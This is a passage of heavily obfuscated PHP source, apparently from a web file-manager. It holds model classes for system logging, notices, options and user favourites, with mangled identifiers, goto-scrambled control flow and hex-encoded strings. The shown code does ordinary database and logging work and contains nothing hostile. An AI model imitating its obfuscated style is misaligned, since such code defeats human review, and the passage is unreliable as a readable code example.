array($D¡‡·¾ÌÂØ[1643] => array($D¡‡·¾ÌÂØ[1644]), $D¡‡·¾ÌÂØ[1998] => array($D¡‡·¾ÌÂØ[2055]), $D¡‡·¾ÌÂØ[2000] => array($D¡‡·¾ÌÂØ[2056]), $D¡‡·¾ÌÂØ[1636] => array($D¡‡·¾ÌÂØ[1637]), $D¡‡·¾ÌÂØ[2006] => array(), $D¡‡·¾ÌÂØ[2008] => array(), $D¡‡·¾ÌÂØ[2010] => array(), $D¡‡·¾ÌÂØ[1646] => array($D¡‡·¾ÌÂØ[1648]), $D¡‡·¾ÌÂØ[1647] => array($D¡‡·¾ÌÂØ[1648]), $D¡‡·¾ÌÂØ[2014] => array($D¡‡·¾ÌÂØ[2057]), $D¡‡·¾ÌÂØ[2016] => array($D¡‡·¾ÌÂØ[2057]), $D¡‡·¾ÌÂØ[2018] => array($D¡‡·¾ÌÂØ[2058]), $D¡‡·¾ÌÂØ[2004] => array($D¡‡·¾ÌÂØ[2059]), $D¡‡·¾ÌÂØ[1641] => array($D¡‡·¾ÌÂØ[2060]), $D¡‡·¾ÌÂØ[2021] => array($D¡‡·¾ÌÂØ[2061]), $D¡‡·¾ÌÂØ[1640] => array($D¡‡·¾ÌÂØ[1642])); return $Dä¶×‚áëô; } private function typeAll() { goto c¾ø¯Ú”»è; dÒ° óÌ÷‘: foreach ($E»ËÙï·ï— as $cÄøâ±­Ô => $FºŸïŒíÚ) { $fÃ¦™Ñãßè[$FºŸïŒíÚ[0]] = $fÃ¦™Ñãßè[$cÄøâ±­Ô]; } $fÃ¦™Ñãßè[$b¡¨Úï‘»è[1648]] = LNG($b¡¨Úï‘»è[2062]); $fÃ¦™Ñãßè[$b¡¨Úï‘»è[2057]] = LNG($b¡¨Úï‘»è[2063]); goto FÉÌóºêºí; FÉÌóºêºí: return $fÃ¦™Ñãßè; goto a‰ ¶ªÇ®; c¾ø¯Ú”»è: $b¡¨Úï‘»è =& $_SERVER[¾÷]; $fÃ¦™Ñãßè = $this->typeList; $E»ËÙï·ï— = array_filter($this->typeFile()); goto dÒ° óÌ÷‘; a‰ ¶ªÇ®: } public function addLog($Eâ¬´¤„·, $a‰¨†ãÈ‚ˆ = array()) { goto CãğÒÚ¡íî; cõ·¸îƒ: $a‰¨†ãÈ‚ˆ = array($AŒº¡ë³ä[1496] => Session::sign(), $AŒº¡ë³ä[1497] => $dÎŸ…’ÆÃ, $AŒº¡ë³ä[39] => $Eâ¬´¤„·, $AŒº¡ë³ä[1499] => json_encode($a‰¨†ãÈ‚ˆ)); parent::add($a‰¨†ãÈ‚ˆ); goto Dà‘‚¸µ•; CãğÒÚ¡íî: $AŒº¡ë³ä =& $_SERVER[¾÷]; if (!isset($this->typeList[$Eâ¬´¤„·])) { return; } $dÎŸ…’ÆÃ = defined($AŒº¡ë³ä[457]) && USER_ID ? USER_ID : (isset($a‰¨†ãÈ‚ˆ[$AŒº¡ë³ä[1505]]) ? $a‰¨†ãÈ‚ˆ[$AŒº¡ë³ä[1505]] : 0); goto D¬ê˜¸ŸŠÒ; D¬ê˜¸ŸŠÒ: if (!$dÎŸ…’ÆÃ) { $dÎŸ…’ÆÃ = (int) Session::get($AŒº¡ë³ä[1795]); } $cØ÷ÈãİÕ = get_client_ip(); if (!$a‰¨†ãÈ‚ˆ || strlen(json_encode($a‰¨†ãÈ‚ˆ)) >= 1024) { $a‰¨†ãÈ‚ˆ = array($AŒº¡ë³ä[2064] => $cØ÷ÈãİÕ); } else { if (is_array($a‰¨†ãÈ‚ˆ)) { $a‰¨†ãÈ‚ˆ[$AŒº¡ë³ä[2064]] = $cØ÷ÈãİÕ; } else { $a‰¨†ãÈ‚ˆ = array($AŒº¡ë³ä[1064] => $a‰¨†ãÈ‚ˆ, $AŒº¡ë³ä[2064] => $cØ÷ÈãİÕ); } } goto cõ·¸îƒ; Dà‘‚¸µ•: } public function remove($C¦æİ®ÚêÛ) { $this->where(array($_SERVER[¾÷][415] => $C¦æİ®ÚêÛ))->delete(); } private function _makeOrder($A¶ßäºÕõ = '') { goto BêŞÎ„; Fò Ñ¹ò: $CŠŒêê“ƒË = Input::get($CÕŒ à¼ “[439], $CÕŒ à¼ “[17], $CÕŒ à¼ “[1827], array($CÕŒ à¼ “[1751], $CÕŒ à¼ “[433])); $CŠŒêê“ƒË = $eµÆæ±ŒÔ”[$CŠŒêê“ƒË]; $A¶ßäºÕõ = $A¶ßäºÕõ . "{$DÙĞØµ‰»}\40{$CŠŒêê“ƒË}"; goto Cì·¥¡ï©Š; Cì·¥¡ï©Š: return $this->order($A¶ßäºÕõ); goto dªˆ§»—’; BêŞÎ„: $CÕŒ à¼ “ =& $_SERVER[¾÷]; $DÙĞØµ‰» = $CÕŒ à¼ “[202]; $eµÆæ±ŒÔ” = array($CÕŒ à¼ “[431] => $CÕŒ à¼ “[432], $CÕŒ à¼ “[433] => $CÕŒ à¼ “[434]); goto Fò Ñ¹ò; dªˆ§»—’: } public function get($cğ·ÃÉà÷… = '') { goto C†™á­åÑ; A²›ÖÎÍÄ : $CŞõ”ˆêš[$Fª¢‘ÀŸÔß[374]] = $this->logList($CŞõ”ˆêš[$Fª¢‘ÀŸÔß[374]]); return $CŞõ”ˆêš; goto Fö›˜›Æ‘¦; C†™á­åÑ: $Fª¢‘ÀŸÔß =& $_SERVER[¾÷]; if (!$cğ·ÃÉà÷…) { show_json(array()); } $E¤Äê¤¥Ù = array(); goto D¢£„ò½ˆˆ; eŒ×‡¶ƒ: if (!empty($cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[2064]])) { $E¤Äê¤¥Ù[$Fª¢‘ÀŸÔß[434]] = array($Fª¢‘ÀŸÔß[387], "\45{$cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[2064]]}\45"); } $CŞõ”ˆêš = $this->_makeOrder()->where($E¤Äê¤¥Ù)->selectPage(); if (empty($CŞõ”ˆêš[$Fª¢‘ÀŸÔß[374]])) { show_json(array(), !0, $CŞõ”ˆêš[$Fª¢‘ÀŸÔß[371]]); } goto A²›ÖÎÍÄ ; D¢£„ò½ˆˆ: if ($cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[1505]]) { $E¤Äê¤¥Ù[$Fª¢‘ÀŸÔß[1505]] = $cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[1505]]; } if (isset($cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[724]])) { $Bñ ó˜¿æ = $cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[724]]; $dî¦”ìÍÊ = isset($cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[479]]) ? $cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[479]] : time(); $E¤Äê¤¥Ù[$Fª¢‘ÀŸÔß[202]] = array($Fª¢‘ÀŸÔß[338], array($Bñ ó˜¿æ, $dî¦”ìÍÊ)); } if ($cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[39]]) { $F›˜×ôâù = explode($Fª¢‘ÀŸÔß[57], $cğ·ÃÉà÷…[$Fª¢‘ÀŸÔß[39]]); $cìÀºŒˆ‹ = $this->typeFile(); $f°—ä­‰Šê = array(); foreach ($F›˜×ôâù as $F—àò–Š•) { $f°—ä­‰Šê[] = $F—àò–Š•; if (isset($cìÀºŒˆ‹[$F—àò–Š•])) { $f°—ä­‰Šê = array_merge($f°—ä­‰Šê, $cìÀºŒˆ‹[$F—àò–Š•]); } } $f°—ä­‰Šê = array_unique($f°—ä­‰Šê); if ($f°—ä­‰Šê) { $E¤Äê¤¥Ù[$Fª¢‘ÀŸÔß[39]] = array($Fª¢‘ÀŸÔß[17], $f°—ä­‰Šê); } } goto eŒ×‡¶ƒ; Fö›˜›Æ‘¦: } private function ipAddress(&$EÅ„«Ê×ñ) { $CÚå­Ú²ÏĞ =& $_SERVER[¾÷]; if (!empty($EÅ„«Ê×ñ[$CÚå­Ú²ÏĞ[2064]])) { $EÍ÷ùÍğÒ­ = IpLocation::get($EÅ„«Ê×ñ[$CÚå­Ú²ÏĞ[2064]]); } else { $EÍ÷ùÍğÒ­ = LNG($CÚå­Ú²ÏĞ[2065]); } $EÅ„«Ê×ñ[$CÚå­Ú²ÏĞ[2066]] = $EÍ÷ùÍğÒ­; } private function descZipDownload($DÖ²Ë‹ïÜ·, &$aÜç´˜ï‡) { $Dë…ÈáÆ„İ =& $_SERVER[¾÷]; if (!isset($DÖ²Ë‹ïÜ·[$Dë…ÈáÆ„İ[2067]])) { return; } $dÎœ÷™Îñ = json_decode($DÖ²Ë‹ïÜ·[$Dë…ÈáÆ„İ[2067]], !0); foreach ($dÎœ÷™Îñ as $Bˆóò°ÏÙÂ) { try { $e’ˆå²•ÀÌ = IO::infoFull($Bˆóò°ÏÙÂ[$Dë…ÈáÆ„İ[85]]); } catch (Exception $A£îã®ÖÚ) { continue; } $DÖ²Ë‹ïÜ·[$Dë…ÈáÆ„İ[85]] = $Bˆóò°ÏÙÂ[$Dë…ÈáÆ„İ[85]]; $aÜç´˜ï‡[] = $DÖ²Ë‹ïÜ·[$Dë…ÈáÆ„İ[399]] = $e’ˆå²•ÀÌ[$Dë…ÈáÆ„İ[399]]; $aÜç´˜ï‡[] = $DÖ²Ë‹ïÜ·[$Dë…ÈáÆ„İ[1883]] = $e’ˆå²•ÀÌ[$Dë…ÈáÆ„İ[481]]; break; } return $DÖ²Ë‹ïÜ·; } private function getSourceList(&$F–ç§­Ğï) { $fóæøèéğ® =& $_SERVER[¾÷]; $dßØŠ°æñ¤ = array(); foreach ($F–ç§­Ğï as $ašÈÖÑëô => $c¶ÛÂ…ƒ‚Ù) { goto Cã¯‚÷›; Cã¯‚÷›: $bØšàÃ‚• = json_decode($c¶ÛÂ…ƒ‚Ù[$fóæøèéğ®[434]], !0); if ($c¶ÛÂ…ƒ‚Ù[$fóæøèéğ®[39]] == $fóæøèéğ®[1639]) { $bØšàÃ‚• = $this->descZipDownload($bØšàÃ‚•, $dßØŠ°æñ¤); $F–ç§­Ğï[$ašÈÖÑëô][$fóæøèéğ®[434]] = json_encode($bØšàÃ‚•); continue; } if (strpos($c¶ÛÂ…ƒ‚Ù[$fóæøèéğ®[39]], $fóæøèéğ®[1884]) !== 0) { if (!isset($bØšàÃ‚•[$fóæøèéğ®[85]]) || strpos($c¶ÛÂ…ƒ‚Ù[$fóæøèéğ®[39]], $fóæøèéğ®[2068]) !== 0) { continue; } try { $CÓ…¿‰”ï… = IO::infoFull($bØšàÃ‚•[$fóæøèéğ®[85]]); } catch (Exception $E¼¬ôÉ Ë÷) { continue; } $dßØŠ°æñ¤[] = $bØšàÃ‚•[$fóæøèéğ®[399]] = $CÓ…¿‰”ï…[$fóæøèéğ®[399]]; $dßØŠ°æñ¤[] = $bØšàÃ‚•[$fóæøèéğ®[1883]] = $CÓ…¿‰”ï…[$fóæøèéğ®[481]]; $F–ç§­Ğï[$ašÈÖÑëô][$fóæøèéğ®[434]] = json_encode($bØšàÃ‚•); continue; } goto BßŠßçĞœ; Aã®¾Ò‚±”: if ($bØšàÃ‚•[$fóæøèéğ®[39]] == $fóæøèéğ®[1891]) { $dßØŠ°æñ¤[] = $bØšàÃ‚•[$fóæøèéğ®[434]][$fóæøèéğ®[399]]; } goto cª‰‰¸ºÕÃ; BßŠßçĞœ: $dßØŠ°æñ¤[] = $bØšàÃ‚•[$fóæøèéğ®[399]]; $dßØŠ°æñ¤[] = $bØšàÃ‚•[$fóæøèéğ®[1883]]; if ($bØšàÃ‚•[$fóæøèéğ®[39]] == $fóæøèéğ®[524]) { $dßØŠ°æñ¤[] = $bØšàÃ‚•[$fóæøèéğ®[434]][$fóæøèéğ®[1031]]; $dßØŠ°æñ¤[] = $bØšàÃ‚•[$fóæøèéğ®[434]][$fóæøèéğ®[1032]]; } goto Aã®¾Ò‚±”; cª‰‰¸ºÕÃ: } if (!$dßØŠ°æñ¤) { return array(); } return Model($fóæøèéğ®[776])->sourceListInfo($dßØŠ°æñ¤, !0); } private function logList($CëáÑò¨Ñ) { goto f×¿İÀÜ–é; cµé¹²²¡: return $B°¿…Í‹ìĞ; goto B¤›‰ç™½; f×¿İÀÜ–é: $B»ï†ó— =& $_SERVER[¾÷]; $f¨´˜÷òªç = array_to_keyvalue($CëáÑò¨Ñ, $B»ï†ó—[43], $B»ï†ó—[1505]); $AïÔ„ÈÀ = Model($B»ï†ó—[510])->userListInfo(array_unique($f¨´˜÷òªç)); goto Aé¥ó¦ÌØŞ; fÜ´ÓÏµƒ³: $fÙÚ»ó¢ = array(); foreach ($CëáÑò¨Ñ as $aƒ¾¯—Ÿ­ => $Dİøê»™“) { goto CÚÒ¡ëö«÷; C¥­ÉŸ¢£×: $this->ipAddress($Dİøê»™“); if (strpos($bšº¦§¨àä, $B»ï†ó—[1884]) === 0 || isset($C´‘éØˆƒ[$B»ï†ó—[1883]])) { goto fñî¤´¹ŒÉ; aøğÜë‘’: if ($C´‘éØˆƒ[$B»ï†ó—[39]] == $B»ï†ó—[1891]) { $C´‘éØˆƒ[$B»ï†ó—[434]][$B»ï†ó—[399]] = $cĞ†§£µïË[$C´‘éØˆƒ[$B»ï†ó—[434]][$B»ï†ó—[399]]]; } if ($C´‘éØˆƒ[$B»ï†ó—[39]] == $B»ï†ó—[1634]) { $C´‘éØˆƒ[$B»ï†ó—[1896]] = $C´‘éØˆƒ[$B»ï†ó—[94]]; $C´‘éØˆƒ[$B»ï†ó—[1883]] = $C´‘éØˆƒ[$B»ï†ó—[1896]][$B»ï†ó—[399]]; $C´‘éØˆƒ[$B»ï†ó—[94]] = !1; $C´‘éØˆƒ[$B»ï†ó—[399]] = $B»ï†ó—[43]; } if ($C´‘éØˆƒ[$B»ï†ó—[94]] && $C´‘éØˆƒ[$B»ï†ó—[94]][$B»ï†ó—[407]] == $B»ï†ó—[1145]) { $fÙÚ»ó¢[] = $Dİøê»™“[$B»ï†ó—[397]]; unset($CëáÑò¨Ñ[$aƒ¾¯—Ÿ­]); continue; } goto eÃ…Ò£ìº˜; fñî¤´¹ŒÉ: $C´‘éØˆƒ[$B»ï†ó—[94]] = $cĞ†§£µïË[$C´‘éØˆƒ[$B»ï†ó—[399]]]; $C´‘éØˆƒ[$B»ï†ó—[1896]] = $cĞ†§£µïË[$C´‘éØˆƒ[$B»ï†ó—[1883]]]; if ($C´‘éØˆƒ[$B»ï†ó—[39]] == $B»ï†ó—[524]) { $C´‘éØˆƒ[$B»ï†ó—[434]][$B»ï†ó—[1031]] = $cĞ†§£µïË[$C´‘éØˆƒ[$B»ï†ó—[434]][$B»ï†ó—[1031]]]; $C´‘éØˆƒ[$B»ï†ó—[434]][$B»ï†ó—[1032]] = $cĞ†§£µïË[$C´‘éØˆƒ[$B»ï†ó—[434]][$B»ï†ó—[1032]]]; } goto aøğÜë‘’; eÃ…Ò£ìº˜: if ($C´‘éØˆƒ[$B»ï†ó—[1896]] && $C´‘éØˆƒ[$B»ï†ó—[1896]][$B»ï†ó—[407]] == $B»ï†ó—[1145]) { $fÙÚ»ó¢[] = $Dİøê»™“[$B»ï†ó—[397]]; unset($CëáÑò¨Ñ[$aƒ¾¯—Ÿ­]); continue; } goto FõĞªÌèòÚ; FõĞªÌèòÚ: } $Dİøê»™“[$B»ï†ó—[434]] = $C´‘éØˆƒ; goto Eã¥¹ÜïÙÖ; EˆÕŠŒ¶ç: $Dİøê»™“[$B»ï†ó—[1826]] = $EÙÛ›¸³–Ñ; $C´‘éØˆƒ = json_decode($Dİøê»™“[$B»ï†ó—[434]], !0); $Dİøê»™“[$B»ï†ó—[2064]] = isset($C´‘éØˆƒ[$B»ï†ó—[2064]]) ? $C´‘éØˆƒ[$B»ï†ó—[2064]] : $B»ï†ó—[43]; goto C¥­ÉŸ¢£×; CÚÒ¡ëö«÷: $bšº¦§¨àä = $Dİøê»™“[$B»ï†ó—[39]]; $EÙÛ›¸³–Ñ = isset($AïÔ„ÈÀ[$Dİøê»™“[$B»ï†ó—[1505]]]) ? $AïÔ„ÈÀ[$Dİøê»™“[$B»ï†ó—[1505]]] : !1; $fÕ¸¾ì›™§ = strpos($bšº¦§¨àä, $B»ï†ó—[2069]) === 0 ? LNG($B»ï†ó—[2070]) : LNG($B»ï†ó—[2065]); goto b£Ûáœåå; b£Ûáœåå: $Dİøê»™“[$B»ï†ó—[38]] = isset($EÙÛ›¸³–Ñ[$B»ï†ó—[38]]) ? $EÙÛ›¸³–Ñ[$B»ï†ó—[38]] : LNG($B»ï†ó—[2065]); $Dİøê»™“[$B»ï†ó—[1932]] = isset($EÙÛ›¸³–Ñ[$B»ï†ó—[1932]]) ? $EÙÛ›¸³–Ñ[$B»ï†ó—[1932]] : $B»ï†ó—[43]; $Dİøê»™“[$B»ï†ó—[1410]] = isset($d—•”šíè[$bšº¦§¨àä]) ? $d—•”šíè[$bšº¦§¨àä] : $fÕ¸¾ì›™§; goto EˆÕŠŒ¶ç; Eã¥¹ÜïÙÖ: unset($Dİøê»™“[$B»ï†ó—[2071]]); $B°¿…Í‹ìĞ[] = $Dİøê»™“; goto bçò“½îëò; bçò“½îëò: } $this->clearSystemPathLog($fÙÚ»ó¢); goto cµé¹²²¡; Aé¥ó¦ÌØŞ: $cĞ†§£µïË = $this->getSourceList($CëáÑò¨Ñ); $d—•”šíè = $this->typeAll(); $B°¿…Í‹ìĞ = array(); goto fÜ´ÓÏµƒ³; B¤›‰ç™½: } private function clearSystemPathLog($eœ¥¿Üã„ß) { $b’÷…‘ìÚÏ =& $_SERVER[¾÷]; if (count($eœ¥¿Üã„ß) == 0) { return; } $bÙ‰ºî—‰İ = array($b’÷…‘ìÚÏ[397] => array($b’÷…‘ìÚÏ[17], array_unique($eœ¥¿Üã„ß))); $this->where($bÙ‰ºî—‰İ)->delete(); } public function deviceList($f‹©§ , $eİ°èõæÜ¡ = 0) { $Fº‰Í³ÒÍ =& $_SERVER[¾÷]; $EùÈ…‘® = array($Fº‰Í³ÒÍ[1505] => $f‹©§ , $Fº‰Í³ÒÍ[202] => array($Fº‰Í³ÒÍ[948], $eİ°èõæÜ¡), $Fº‰Í³ÒÍ[39] => $Fº‰Í³ÒÍ[1608]); $fËïäâˆ²¯ = array(); $f–¶ñó¾Æ¢ = $this->field($Fº‰Í³ÒÍ[2072])->where($EùÈ…‘®)->order($Fº‰Í³ÒÍ[1894])->limit(50)->select(); foreach ($f–¶ñó¾Æ¢ as $A†é•Õ‰Â => $c¿¯•†Üõ‹) { goto fÚ¤ğ–•ê; aç´£‡Ğò: $this->ipAddress($c¿¯•†Üõ‹); $c¿¯•†Üõ‹[$Fº‰Í³ÒÍ[434]] = $fˆß‚ä–¡; $fËïäâˆ²¯[$a°‹‡éÙÈá] = $c¿¯•†Üõ‹; goto cßÌ£ôöõ; fÚ¤ğ–•ê: if ($A†é•Õ‰Â > 0 && abs($c¿¯•†Üõ‹[$Fº‰Í³ÒÍ[202]] - $f–¶ñó¾Æ¢[$A†é•Õ‰Â - 1][$Fº‰Í³ÒÍ[202]]) < 5) { continue; } $fˆß‚ä–¡ = json_decode($c¿¯•†Üõ‹[$Fº‰Í³ÒÍ[434]], !0); $c¿¯•†Üõ‹[$Fº‰Í³ÒÍ[2064]] = isset($fˆß‚ä–¡[$Fº‰Í³ÒÍ[2064]]) ? $fˆß‚ä–¡[$Fº‰Í³ÒÍ[2064]] : $Fº‰Í³ÒÍ[43]; goto Eãã–ºİòª; Eãã–ºİòª: unset($fˆß‚ä–¡[$Fº‰Í³ÒÍ[2064]]); $a°‹‡éÙÈá = $this->deviceType($fˆß‚ä–¡[$Fº‰Í³ÒÍ[1885]]); if (isset($fËïäâˆ²¯[$a°‹‡éÙÈá])) { continue; } goto aç´£‡Ğò; cßÌ£ôöõ: } return array_values($fËïäâˆ²¯); } public function deviceType($Bí©¢¯¨¼£) { return $Bí©¢¯¨¼£; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\156\x6f\164\x69\143\x65\114\151\x73\x74"; public $field = array("\156\141\155\145", "\x63\157\x6e\x74\145\x6e\x74", "\141\165\164\x68", "\x6d\x6f\x64\x65", "\164\151\x6d\x65", "\x74\171\x70\145", "\x6c\145\166\x65\x6c", "\145\x6e\141\142\x6c\145", "\163\x6f\x72\164"); public function listData($bêè×—¤›À = false, $då¶ù´×© = "\x73\157\x72\x74", $Añªƒè¯ = false) { return parent::listData($bêè×—¤›À, $då¶ù´×©, $Añªƒè¯); } public function add($AÓ‡Ö”ŠÎæ) { $cĞ¿°ÆÖİ =& $_SERVER[¾÷]; $döÒÑ·à×å = time(); if ($AÓ‡Ö”ŠÎæ[$cĞ¿°ÆÖİ[22]] == $cĞ¿°ÆÖİ[2073]) { $döÒÑ·à×å = strtotime($AÓ‡Ö”ŠÎæ[$cĞ¿°ÆÖİ[205]]); } $AÓ‡Ö”ŠÎæ[$cĞ¿°ÆÖİ[205]] = $döÒÑ·à×å; return parent::insert($AÓ‡Ö”ŠÎæ); } public function update($EŒƒ‘¡öà, $DÒİ˜ßó¿Â) { goto c¸Í…´˜ª; c¸Í…´˜ª: $c¿éóí–æš =& $_SERVER[¾÷]; $aøªïãíéµ = $this->listData($EŒƒ‘¡öà); if (!$aøªïãíéµ) { return !1; } goto dÎ‰„¥²¬µ; dÎ‰„¥²¬µ: $cŠ¥âÆñÕƒ = time(); if ($DÒİ˜ßó¿Â[$c¿éóí–æš[22]] == $c¿éóí–æš[2073]) { $cŠ¥âÆñÕƒ = strtotime($DÒİ˜ßó¿Â[$c¿éóí–æš[205]]); } $DÒİ˜ßó¿Â[$c¿éóí–æš[205]] = $cŠ¥âÆñÕƒ; goto dã‚²”Öá‚; dã‚²”Öá‚: return parent::update($EŒƒ‘¡öà, $DÒİ˜ßó¿Â); goto CïèĞ’ô; CïèĞ’ô: } public function remove($AŠò¥ç‘³) { $f‡Ğ­ËÅŸ = $this->listData($AŠò¥ç‘³); if (!$f‡Ğ­ËÅŸ || $f‡Ğ­ËÅŸ[$_SERVER[¾÷][1145]]) { return !1; } return parent::remove($AŠò¥ç‘³); } public function sort($B¦©Œ­ÏªÂ, $b•™èàÒ…¿) { return parent::update($B¦©Œ­ÏªÂ, $b•™èàÒ…¿); } public function enable($F†„Ë¾Á™, $eô¶»¤ª»ï) { return parent::update($F†„Ë¾Á™, array($_SERVER[¾÷][2074] => $eô¶»¤ª»ï)); } private function initUserOption() { $EÚöÓªÔ ¬ =& $_SERVER[¾÷]; $this->optionType = $EÚöÓªÔ ¬[2075]; $this->modelType = $EÚöÓªÔ ¬[2076]; $this->field = array($EÚöÓªÔ ¬[2077], $EÚöÓªÔ ¬[38], $EÚöÓªÔ ¬[205], $EÚöÓªÔ ¬[39], $EÚöÓªÔ ¬[2078], $EÚöÓªÔ ¬[711], $EÚöÓªÔ ¬[198]); } public function userNoticeGet($Eê–õ«¼Ùé = false) { $this->initUserOption(); return parent::listData($Eê–õ«¼Ùé, $_SERVER[¾÷][397], !0); } public function userNoticeAdd($F·µÅèÅŠ) { $eó†í»§Ü¯ =& $_SERVER[¾÷]; $this->initUserOption(); $Eƒ”«Ïæ = $this->findByKey($eó†í»§Ü¯[2077], $F·µÅèÅŠ[$eó†í»§Ü¯[397]]); if ($Eƒ”«Ïæ) { return !0; } $eÏ˜Ö¢Úƒƒ = array($eó†í»§Ü¯[2077] => $F·µÅèÅŠ[$eó†í»§Ü¯[397]], $eó†í»§Ü¯[38] => $F·µÅèÅŠ[$eó†í»§Ü¯[38]], $eó†í»§Ü¯[205] => $F·µÅèÅŠ[$eó†í»§Ü¯[205]], $eó†í»§Ü¯[39] => isset($F·µÅèÅŠ[$eó†í»§Ü¯[39]]) ? $F·µÅèÅŠ[$eó†í»§Ü¯[39]] : 1, $eó†í»§Ü¯[2078] => isset($F·µÅèÅŠ[$eó†í»§Ü¯[2078]]) ? $F·µÅèÅŠ[$eó†í»§Ü¯[2078]] : 0, $eó†í»§Ü¯[711] => 0, $eó†í»§Ü¯[198] => 0); return parent::insert($eÏ˜Ö¢Úƒƒ); } public function userNoticeEdit($F¬õãã±², $fƒê†›‡²ø) { $this->initUserOption(); return parent::update($F¬õãã±², $fƒê†›‡²ø); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\x65\155\137\x6f\x70\x74\151\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\x6f\154\145", "\x72\x6f\x6c\145\x47\162\157\x75\160", "\162\145\147\151\163\x74", "\x65\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($F»ŒŞé‹“Ş) { return "\x53\x79\163\x74\x65\x6d\x4f\x70\x74\x69\x6f\x6e\x5f{$F»ŒŞé‹“Ş}"; } protected function optionDefault($A«‡‚²„ºÄ = '') { $D¯”Æìöè– =& $_SERVER[¾÷]; if ($A«‡‚²„ºÄ == $D¯”Æìöè–[43]) { return $GLOBALS[$D¯”Æìöè–[16]][$D¯”Æìöè–[385]]; } } } goto Aœæ¾½¡­ª; cÕ˜Ñ˜ç¥Œ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($f¡ñõÒ³»†) { $aŒÈ×ìù =& $_SERVER[¾÷]; return array($aŒÈ×ìù[1771] => array(USER_ID, $aŒÈ×ìù[2085])); } protected function listData() { $Cİ–„Ì =& $_SERVER[¾÷]; $cÁíÒ®îê = array($Cİ–„Ì[1497] => USER_ID, $Cİ–„Ì[466] => 0); $FÄ¾»©©„† = $Cİ–„Ì[2086]; $DŸ•Òîİğ = $this->field($FÄ¾»©©„†)->where($cÁíÒ®îê)->order($Cİ–„Ì[2087])->select(); return $DŸ•Òîİğ ? $DŸ•Òîİğ : array(); } protected function resetCache() { } protected function listView() { goto f„”ì’åò¡; aì‚ëÕÂÓÖ: $dİÀ¸”·Ìš = array_to_keyvalue($dİÀ¸”·Ìš, $CÂÔ«©ˆÊ°[399]); foreach ($EßùÒŒÕ¼ as $e¨ÔÕŠª“¾ => $d×ÈØí¤±¤) { $EôÕö‚ìë = $dİÀ¸”·Ìš[$d×ÈØí¤±¤[$CÂÔ«©ˆÊ°[85]]]; $EôÕö‚ìë = $EôÕö‚ìë ? $EôÕö‚ìë : array(); $EßùÒŒÕ¼[$e¨ÔÕŠª“¾] = array_merge($EôÕö‚ìë, $d×ÈØí¤±¤); } return $EßùÒŒÕ¼; goto c§ÛÉïÇ¥À; d±Á›åéƒ: $d›°Ô§ÆÃÜ = array_to_keyvalue($d­ÌŠ±İø, $CÂÔ«©ˆÊ°[43], $CÂÔ«©ˆÊ°[85]); if (!$d›°Ô§ÆÃÜ) { return $EßùÒŒÕ¼; } $d¢Ûäœºç = 2000; goto c©¯Ç´˜Õ; c©¯Ç´˜Õ: $bñ˜ĞŸ‹Â— = array($CÂÔ«©ˆÊ°[413] => array($CÂÔ«©ˆÊ°[414], $d›°Ô§ÆÃÜ)); $dİÀ¸”·Ìš = Model($CÂÔ«©ˆÊ°[776])->listSource($bñ˜ĞŸ‹Â—, $d¢Ûäœºç); $dİÀ¸”·Ìš = array_merge($dİÀ¸”·Ìš[$CÂÔ«©ˆÊ°[83]], $dİÀ¸”·Ìš[$CÂÔ«©ˆÊ°[84]]); goto aì‚ëÕÂÓÖ; f„”ì’åò¡: $CÂÔ«©ˆÊ° =& $_SERVER[¾÷]; $EßùÒŒÕ¼ = $this->listData(); $d­ÌŠ±İø = array_filter_by_field($EßùÒŒÕ¼, $CÂÔ«©ˆÊ°[39], $CÂÔ«©ˆÊ°[412]); goto d±Á›åéƒ; c§ÛÉïÇ¥À: } protected function addFav($bÅˆ†åÔË°, $eÃ½Ë®¹Œ÷ = '', $c­ì„ƒà = "\163\157\x75\x72\x63\x65") { goto aê÷ŒÛ¸•; AœãÚç¿µ: $aÎÈè´Ï° = array($CÎİÕ³Ùí½[1497] => USER_ID, $CÎİÕ³Ùí½[466] => 0); $AÀ‰ŞöÜ® = $this->where($aÎÈè´Ï°)->max($CÎİÕ³Ùí½[1691]); if (!$AÀ‰ŞöÜ®) { $AÀ‰ŞöÜ® = 0; } goto bÆß¢çµ·Ô; F©œœ‡“š¢: return $this->add($CĞœ£Ëäöá); goto CÇ×ó´¡è; bÆß¢çµ·Ô: if (!$eÃ½Ë®¹Œ÷ && $c­ì„ƒà == $CÎİÕ³Ùí½[412]) { $eÑò¢Ó’Ğ = Model($CÎİÕ³Ùí½[1180])->where(array($CÎİÕ³Ùí½[413] => $bÅˆ†åÔË°))->find(); if (!$eÑò¢Ó’Ğ) { return !1; } $eÃ½Ë®¹Œ÷ = $eÑò¢Ó’Ğ[$CÎİÕ³Ùí½[38]]; } $eÃ½Ë®¹Œ÷ = $this->getAutoName($eÃ½Ë®¹Œ÷); $CĞœ£Ëäöá = array($CÎİÕ³Ùí½[1497] => USER_ID, $CÎİÕ³Ùí½[466] => 0, $CÎİÕ³Ùí½[416] => $eÃ½Ë®¹Œ÷, $CÎİÕ³Ùí½[417] => $bÅˆ†åÔË°, $CÎİÕ³Ùí½[418] => $c­ì„ƒà, $CÎİÕ³Ùí½[1672] => $AÀ‰ŞöÜ® + 1); goto F©œœ‡“š¢; aê÷ŒÛ¸•: $CÎİÕ³Ùí½ =& $_SERVER[¾÷]; $aÎÈè´Ï° = array($CÎİÕ³Ùí½[1497] => USER_ID, $CÎİÕ³Ùí½[466] => 0, $CÎİÕ³Ùí½[418] => $c­ì„ƒà, $CÎİÕ³Ùí½[417] => $bÅˆ†åÔË°); if ($this->where($aÎÈè´Ï°)->find()) { return !1; } goto AœãÚç¿µ; CÇ×ó´¡è: } protected function remove($cÒ’ÂÏ‹±¿) { $AŸøÊ„Ô¥È =& $_SERVER[¾÷]; $b—×«¢ì¬µ = 